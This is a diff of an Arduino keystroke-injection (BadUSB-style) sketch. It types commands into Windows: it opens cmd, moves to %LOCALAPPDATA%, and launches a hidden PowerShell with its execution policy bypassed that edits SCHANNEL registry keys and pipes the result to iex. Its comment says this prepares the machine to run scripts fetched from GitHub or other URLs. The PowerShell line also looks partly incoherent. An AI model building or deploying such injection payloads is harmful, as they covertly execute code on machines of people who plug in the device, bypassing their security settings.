@@ -46,13 +46,13 @@ void setup(){
     Keyboard.releaseAll();
     delay(500);
     Keyboard.print("cmd");
-    delay(500);
+    delay(defaultDelay);
     typeKey(KEY_RETURN);
     delay(1000);
-    Keyboard.print("h:");   // change the drive letter here
-    delay(1000);
+    Keyboard.print("cd %LOCALAPPDATA%");  
+    delay(defaultDelay);
     typeKey(KEY_RETURN);
-    delay(1000);
+    delay(defaultDelay);
 
     // change windows registry ssl/tsl settings to allow executing powershell script directly from github or other url
     Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {(New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -Force) | iex}");
